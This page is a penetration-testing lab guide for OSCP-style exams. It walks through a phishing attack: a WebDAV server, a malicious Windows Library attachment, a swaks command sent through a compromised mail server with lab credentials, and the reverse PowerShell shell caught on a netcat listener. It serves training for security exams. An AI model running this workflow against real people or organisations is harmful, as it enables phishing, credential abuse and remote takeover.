---
description: >-
  This is a guide for the OSCP & other CTF's that may include phishing as part
  of the exam.
---

# OSCP Phishing Guide



## Outline

In this page we will conduct a phishing attack that goes as follows:

We open a WebDAV server on our Kali host, we create a malicious Microsoft Office Macro that we will send to the organization through a compromised Mail server. Once the victim clicks on the malicious macro it will open a reverse shell back to our Kali attack host.

## Start WebDAV Server

```shell-session
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
...
: Serving on http://0.0.0.0:80 ...
```

## Create Malicious Windows Library

Next we'll create a malicious Windows Library file that we'll use to hold our reverse shell.

{% embed url="https://www.rotta.rocks/ethical-hacking/exploiting-microsoft-office/windows-library-files" %}
Create a malicious Windows Library File
{% endembed %}

Once we've created the Windows Library we transfer the Lirbary file and powercat.ps1 script to the WebDAV server.

## Send Email to Victims

In the beginning of this page we mentioned that we have access to a compromised mail server, there are various tools we can use to leverage SMTP. We will use swaks

```shell-session
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

## Success

After some time we can check back on our netcat listener and see that we successfully phished a victim.

```
elistening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```
